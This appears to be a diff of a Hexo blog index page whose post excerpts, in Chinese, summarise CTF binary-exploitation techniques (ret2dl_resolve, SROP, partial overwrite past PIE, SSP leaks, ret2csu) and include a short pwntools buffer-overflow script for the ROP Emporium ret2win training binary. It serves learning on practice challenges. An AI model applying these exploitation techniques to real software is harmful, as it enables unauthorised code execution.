@@ -1,336 +1,601 @@
 <!DOCTYPE html>
-<html>
-  <!-- Html Head Tag-->
-  <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content>
-  <meta name="author" content="C0yo7e">
-  <!-- Open Graph Data -->
-  <meta property="og:title" content="The lair of C0yo7e">
-  <meta property="og:description" content>
-  <meta property="og:site_name" content="The lair of C0yo7e">
-  <meta property="og:type" content="website">
-  <meta property="og:image" content="http://yoursite.com">
-  
-    <link rel="alternate" href="/atom.xml" title="The lair of C0yo7e" type="application/atom+xml">
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
   
   
-    <link rel="icon" href="/favicon.png">
   
-
-  <!-- Site Title -->
-  <title>The lair of C0yo7e</title>
-
-  <!-- Bootstrap CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.min.css">
-  <!-- Custom CSS -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    
+    The lair of C0yo7e</title>
   
-  <link rel="stylesheet" href="/css/style.light.css">
-
-  <!-- Google Analytics -->
+    <link rel="shortcut icon" href="/favicon.ico">
   
-
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
 </head>
-
-  <body>
-    <!-- Page Header -->
-
-
-<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <div class="page-title with-background-image">
-          <p class="title">The lair of C0yo7e</p>
-          <p class="subtitle"></p>
-        </div>
-        <div class="site-menu with-background-image">
-          <ul>
-            
-              <li>
-                <a href="/">
-                  
-                  Home
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="/archives">
-                  
-                  Archives
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="https://github.com/<your-github-username>">
-                  
-                  Github
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="mailto:<your-email-address>">
-                  
-                  Email
-                  
-                </a>
-              </li>
-            
-          </ul>
-        </div>
+</html>
+<body>
+<main class="content">
+  <section class="jumbotron">
+  <div class="video">
+    
+      <div class="video-frame">
+        <img src="/images/ocean/overlay-hero.png" alt="Decorative image frame">
       </div>
+    
+    <div class="video-media">
+      <video playsinline="" autoplay="" loop="" muted="" data-autoplay=""
+             poster="/images/ocean/ocean.png" x5-video-player-type="h5">
+        <source src="/images/ocean/ocean.mp4" type="video/mp4">
+        <source src="/images/ocean/ocean.ogv" type="video/ogg">
+        <source src="/images/ocean/ocean.webm" type="video/webm">
+        <p>Your user agent does not support the HTML5 Video element.</p>
+      </video>
+      <div class="video-overlay"></div>
+    </div>
+    <div class="video-inner text-center text-white">
+      <h1><a href="/">The lair of C0yo7e</a></h1>
+      <p></p>
+      <div><img src="/images/hexo-inverted.svg" class="brand" alt="The lair of C0yo7e"></div>
+    </div>
+    <div class="video-learn-more">
+      <a class="anchor" href="#landingpage"><i class="fe fe-mouse"></i></a>
     </div>
   </div>
-</header>
+</section>
 
-<!-- Home Page Post List -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-10 col-md-10 col-md-offset-1">
+<div id="landingpage">
+  <section class="outer">
+  <article class="articles">
+    
+    <h1 class="page-type-title"></h1>
+
+    
       
-        <div class="post-item-wrapper">
-  <a href="/2019/10/07/runtime-resolve/" class="post-title">
-      runtime_resolve
-  </a>
-  <div class="post-excerpt">
-    <!-- Post Date and Categories -->
-    <div class="date-and-category">
-      <div class="date">2019-10-07</div>
-      <div class="categories">
         
-          Uncategorized
+
+<article id="post-runtime-resolve" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/10/07/runtime-resolve/">runtime_resolve</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/10/07/runtime-resolve/" class="article-date">
+  <time datetime="2019-10-07T04:23:05.000Z" itemprop="datePublished">2019-10-07</time>
+</a>
         
       </div>
-    </div>
-    <!-- Post Excerpt -->
-    <div class="excerpt typo"><p>做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位</p>
-<p>控制程序执行 dl_resolve 函数<br>    给定 Link_map 以及 index 两个参数。<br>    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。<br>控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。<br>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。<br>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p></div>
-    <!-- Post Tags -->
-    <div class="tags">
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
       
-        <div class="untagged">Untagged</div>
+
+
+      
+
+      
+        <p>做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位</p>
+<p>控制程序执行 dl_resolve 函数<br>    给定 Link_map 以及 index 两个参数。<br>    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。<br>控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。<br>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。<br>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p>
+        
+          <a class="article-more-link" href="/2019/10/07/runtime-resolve/">Read More...</a>
+        
       
     </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/07/runtime-resolve/" data-id="ck1g1bl0q0008ekswiqrm6f46"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
   </div>
-</div>
+
+  
+
+  
+
+</article>
+
+
 
       
-        <div class="post-item-wrapper">
-  <a href="/2019/09/02/srop/" class="post-title">
-      srop
-  </a>
-  <div class="post-excerpt">
-    <!-- Post Date and Categories -->
-    <div class="date-and-category">
-      <div class="date">2019-09-02</div>
-      <div class="categories">
         
-          Uncategorized
+
+<article id="post-srop" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/09/02/srop/">srop</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/09/02/srop/" class="article-date">
+  <time datetime="2019-09-02T15:51:52.000Z" itemprop="datePublished">2019-09-02</time>
+</a>
         
       </div>
-    </div>
-    <!-- Post Excerpt -->
-    <div class="excerpt typo"><h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）</p>
-<p>偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）<br><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%871.png" alt></p></div>
-    <!-- Post Tags -->
-    <div class="tags">
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
       
-        <div class="untagged">Untagged</div>
+
+
+      
+
+      
+        <h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）</p>
+<p>偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）<br><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%871.png" alt></p>
+        
+          <a class="article-more-link" href="/2019/09/02/srop/">Read More...</a>
+        
       
     </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/09/02/srop/" data-id="ck1g1bl0o0007ekswetenlgoj"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
   </div>
-</div>
+
+  
+
+  
+
+</article>
+
+
 
       
-        <div class="post-item-wrapper">
-  <a href="/2019/08/20/playfmt/" class="post-title">
-      suctf的两三题wp
-  </a>
-  <div class="post-excerpt">
-    <!-- Post Date and Categories -->
-    <div class="date-and-category">
-      <div class="date">2019-08-20</div>
-      <div class="categories">
         
-          Uncategorized
+
+<article id="post-playfmt" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/08/20/playfmt/">suctf的两三题wp</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/08/20/playfmt/" class="article-date">
+  <time datetime="2019-08-20T14:58:39.000Z" itemprop="datePublished">2019-08-20</time>
+</a>
         
       </div>
-    </div>
-    <!-- Post Excerpt -->
-    <div class="excerpt typo"><p>这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了</p>
-<p>以下附上超级简单题的一些思路，当做给自己的记录吧</p></div>
-    <!-- Post Tags -->
-    <div class="tags">
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
       
-        <div class="untagged">Untagged</div>
+
+
+      
+
+      
+        <p>这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了</p>
+<p>以下附上超级简单题的一些思路，当做给自己的记录吧</p>
+        
+          <a class="article-more-link" href="/2019/08/20/playfmt/">Read More...</a>
+        
       
     </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/08/20/playfmt/" data-id="ck1g1bl0l0006ekswg0nvq4dy"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
   </div>
-</div>
+
+  
+
+  
+
+</article>
+
+
 
       
-        <div class="post-item-wrapper">
-  <a href="/2019/08/16/overwrite/" class="post-title">
-      partial overwrite
-  </a>
-  <div class="post-excerpt">
-    <!-- Post Date and Categories -->
-    <div class="date-and-category">
-      <div class="date">2019-08-16</div>
-      <div class="categories">
         
-          Uncategorized
+
+<article id="post-overwrite" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/08/16/overwrite/">partial overwrite</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/08/16/overwrite/" class="article-date">
+  <time datetime="2019-08-16T07:00:49.000Z" itemprop="datePublished">2019-08-16</time>
+</a>
         
       </div>
-    </div>
-    <!-- Post Excerpt -->
-    <div class="excerpt typo"><h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。<br>（对于绕过PIE的操作我是没怎么接触过的）<br>大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去</p></div>
-    <!-- Post Tags -->
-    <div class="tags">
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
       
-        <div class="untagged">Untagged</div>
+
+
+      
+
+      
+        <h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。<br>（对于绕过PIE的操作我是没怎么接触过的）<br>大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去</p>
+        
+          <a class="article-more-link" href="/2019/08/16/overwrite/">Read More...</a>
+        
       
     </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/08/16/overwrite/" data-id="ck1g1bl0i0004ekswynb1hqt9"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
   </div>
-</div>
+
+  
+
+  
+
+</article>
+
+
 
       
-        <div class="post-item-wrapper">
-  <a href="/2019/08/16/ssp/" class="post-title">
-      ssp操作
-  </a>
-  <div class="post-excerpt">
-    <!-- Post Date and Categories -->
-    <div class="date-and-category">
-      <div class="date">2019-08-16</div>
-      <div class="categories">
         
-          Uncategorized
+
+<article id="post-ssp" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/08/16/ssp/">ssp操作</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/08/16/ssp/" class="article-date">
+  <time datetime="2019-08-16T03:39:15.000Z" itemprop="datePublished">2019-08-16</time>
+</a>
         
       </div>
-    </div>
-    <!-- Post Excerpt -->
-    <div class="excerpt typo"><p>用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串<br>就是通过栈溢出报错信息，泄漏出指定地址的方法：<br>　　stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p></div>
-    <!-- Post Tags -->
-    <div class="tags">
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
       
-        <div class="untagged">Untagged</div>
+
+
+      
+
+      
+        <p>用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串<br>就是通过栈溢出报错信息，泄漏出指定地址的方法：<br>　　stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p>
+        
+          <a class="article-more-link" href="/2019/08/16/ssp/">Read More...</a>
+        
       
     </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/08/16/ssp/" data-id="ck1g1bl0s0009ekswd324gel3"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
   </div>
-</div>
+
+  
+
+  
+
+</article>
+
+
 
       
-        <div class="post-item-wrapper">
-  <a href="/2019/07/08/libc-csu/" class="post-title">
-      libc_csu
-  </a>
-  <div class="post-excerpt">
-    <!-- Post Date and Categories -->
-    <div class="date-and-category">
-      <div class="date">2019-07-08</div>
-      <div class="categories">
         
-          Uncategorized
+
+<article id="post-libc-csu" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/07/08/libc-csu/">libc_csu</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/07/08/libc-csu/" class="article-date">
+  <time datetime="2019-07-08T15:15:17.000Z" itemprop="datePublished">2019-07-08</time>
+</a>
         
       </div>
-    </div>
-    <!-- Post Excerpt -->
-    <div class="excerpt typo"><h2 id="libc-csu"><a href="#libc-csu" class="headerlink" title="_libc_csu"></a><em>_libc_csu</em></h2><p>1、Ret2csu</p>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h2 id="libc-csu"><a href="#libc-csu" class="headerlink" title="_libc_csu"></a><em>_libc_csu</em></h2><p>1、Ret2csu</p>
 <p>这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。<br>Emmm真是一个异常简洁的main函数</p>
 <p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%871.png" alt></p>
 <p>我们发现它有个pwnme函数哦，那就点进去看一下</p>
 <p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%872.png" alt></p>
 <p>它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。</p>
-<p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%873.png" alt></p></div>
-    <!-- Post Tags -->
-    <div class="tags">
-      
-        <div class="untagged">Untagged</div>
+<p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%873.png" alt></p>
+        
+          <a class="article-more-link" href="/2019/07/08/libc-csu/">Read More...</a>
+        
       
     </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/08/libc-csu/" data-id="ck1g1bl0g0002eksw6hhsxzhu"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
   </div>
-</div>
+
+  
+
+  
+
+</article>
+
+
 
       
-        <div class="post-item-wrapper">
-  <a href="/2019/07/08/ROP Emporium/" class="post-title">
-      ROP Emporium
-  </a>
-  <div class="post-excerpt">
-    <!-- Post Date and Categories -->
-    <div class="date-and-category">
-      <div class="date">2019-07-08</div>
-      <div class="categories">
         
-          Uncategorized
+
+<article id="post-ROP Emporium" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/07/08/ROP Emporium/">ROP Emporium</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/07/08/ROP Emporium/" class="article-date">
+  <time datetime="2019-07-08T04:12:19.000Z" itemprop="datePublished">2019-07-08</time>
+</a>
         
       </div>
-    </div>
-    <!-- Post Excerpt -->
-    <div class="excerpt typo"><p>这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。</p>
-<h2 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1-ret2win"></a>1-ret2win</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2win'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=0x0400824</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">payload = 0x20*<span class="string">"a"</span> + p64(0) + p64(shell)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>
-    <!-- Post Tags -->
-    <div class="tags">
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
       
-        <div class="untagged">Untagged</div>
-      
-    </div>
-  </div>
-</div>
+
 
       
+
+      
+        <p>这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。</p>
+<h2 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1-ret2win"></a>1-ret2win</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2win'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=0x0400824</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">payload = 0x20*<span class="string">"a"</span> + p64(0) + p64(shell)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+        
+          <a class="article-more-link" href="/2019/07/08/ROP Emporium/">Read More...</a>
+        
+      
     </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/08/ROP Emporium/" data-id="ck1g1bl0b0000ekswvnkjbgjo"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
   </div>
+
+  
+
+  
+
+</article>
+
+
+
+      
+  </article>
+  
+
+  
+</section>
 </div>
 
-<!-- Pagination -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-10 col-md-10 col-md-offset-1">
-      <ul class="pagination">
-          
-          
-      </ul>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
     </div>
-  </div>
-</div>
-
-
-
-    <!-- Footer -->
-<footer>
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <p class="copyright text-muted">
-          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
-          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
-        <p class="copyright text-muted">
-          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
-        </p>
-      </div>
-    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 The lair of C0yo7e</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
+    </ul>
   </div>
 </footer>
 
+</main>
 
-    <!-- After Footer Scripts -->
-<script src="/js/highlight.pack.js"></script>
-<script>
-  document.addEventListener("DOMContentLoaded", function(event) {
-    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
-    codeBlocks.forEach(function(block, index) {
-      hljs.highlightBlock(block);
-    });
-  });
-</script>
+  <aside class="sidebar">
+    
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="The lair of C0yo7e"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="搜索">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
-  </body>
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/ocean.js"></script>
+
+</body>
 </html>
-
